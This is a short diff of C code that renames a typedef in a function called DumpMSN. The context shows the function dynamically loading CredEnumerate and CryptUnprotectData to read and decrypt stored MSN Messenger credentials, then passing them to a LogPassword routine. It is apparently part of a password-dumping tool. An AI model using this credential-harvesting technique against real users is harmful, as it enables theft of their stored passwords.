@@ -14,7 +14,7 @@ extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass
 
 typedef BOOL (WINAPI *typeCredEnumerate)(WCHAR *, DWORD, DWORD *, PCREDENTIALW **);
 typedef VOID (WINAPI *typeCredFree)(PVOID);
-typedef BOOL (WINAPI *typeCryptUnprotectData)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);
+typedef BOOL (WINAPI *CryptUnprotectData_t)(DATA_BLOB *, LPWSTR *, DATA_BLOB *, PVOID, PVOID, DWORD, DATA_BLOB *);
 
 
 int DumpMSN(void)
@@ -32,7 +32,7 @@ int DumpMSN(void)
 
 	typeCredEnumerate pfCredEnumerate = NULL;
 	typeCredFree pfCredFree = NULL;
-	typeCryptUnprotectData pfCryptUnprotectData = NULL;
+	CryptUnprotectData_t pfCryptUnprotectData = NULL;
 	PCREDENTIALW *CredentialCollection = NULL;
     HMODULE hAdvapi32DLL = NULL;
 	HMODULE hCrypt32DLL = NULL;
@@ -45,7 +45,7 @@ int DumpMSN(void)
 	}
 
 	if ( (hCrypt32DLL = LoadLibrary("crypt32.dll")) )  {
-		pfCryptUnprotectData = (typeCryptUnprotectData)GetProcAddress(hCrypt32DLL, "CryptUnprotectData");
+		pfCryptUnprotectData = (CryptUnprotectData_t)GetProcAddress(hCrypt32DLL, "CryptUnprotectData");
 	}
 
 	// MSN live 2008 & 2009
